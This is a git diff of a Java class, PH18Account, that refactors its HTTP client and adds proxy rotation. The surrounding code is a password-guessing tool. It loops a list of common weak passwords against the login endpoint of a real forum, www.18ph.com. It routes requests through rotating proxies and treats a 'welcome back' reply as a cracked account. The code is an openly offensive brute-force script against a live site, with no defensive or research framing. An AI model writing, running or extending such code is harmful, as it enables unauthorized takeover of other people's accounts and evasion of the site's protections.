@@ -1,6 +1,6 @@
 package account;
 
-import giter.HttpUtil;
+import giter.HttpClient;
 
 import java.io.IOException;
 import java.net.UnknownHostException;
@@ -22,8 +22,8 @@ import com.mongodb.Mongo;
 
 public class PH18Account {
 
-	static HttpUtil util = HttpUtil.instance().connect(3000).read(30000)
-			.persist(false);
+	static HttpClient util = new HttpClient().connect(3000).read(30000)
+			.persistCookies(false).proxier(new SCProxiesModule());
 
 	final static String dic[] = new String[] { "000000", "111111", "11111111",
 			"112233", "123123", "123321", "123456", "12345678", "654321",
@@ -56,7 +56,7 @@ public class PH18Account {
 
 					try {
 
-						content = util.proxy(SCProxiesModule.get()).GET(url);
+						content = util.GET(url).getValue();
 
 						Matcher matcher = ptn.matcher(content);
 
@@ -104,9 +104,8 @@ public class PH18Account {
 		param.put("handlekey", "ls");
 
 		String res = util
-				.proxy(SCProxiesModule.get())
 				.POST("http://www.18ph.com/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1",
-						param);
+						param).getValue();
 
 		return res.contains("欢迎您回来") ? pwd : "wrong";
 	}
